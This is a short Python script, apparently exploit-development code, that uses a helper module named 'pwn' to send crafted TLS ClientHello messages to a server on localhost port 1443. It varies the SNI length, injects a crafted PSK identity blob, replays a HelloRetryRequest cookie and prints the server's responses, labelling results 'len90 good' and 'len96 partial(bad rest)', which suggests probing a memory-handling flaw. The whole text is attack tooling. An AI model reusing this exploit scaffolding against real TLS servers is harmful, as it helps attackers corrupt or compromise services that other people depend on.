import socket, time, pwn
def one(sni_len, blob, label):
    s = socket.create_connection(('127.0.0.1',1443), timeout=5)
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=None, key_share=None))
    r1 = pwn.read_all(s, 0.8); ck = pwn.hrr_cookie(r1)
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=blob, cookie=ck))
    r2 = pwn.read_all(s, 0.5)
    try: s.sendall(bytes([0x15,3,3,0,2,1,0]))
    except Exception: pass
    r3 = pwn.read_all(s, 1.0)
    s.close()
    print(label, "CH2:", r2[:16].hex(), "after:", r3[:32])
c=bytearray(8); c[1]=0x2c
one(0x5a, pwn.make_blob(bytes(c)), "len90 good")
one(0x60, pwn.make_blob(bytes(c)), "len96 partial(bad rest)")
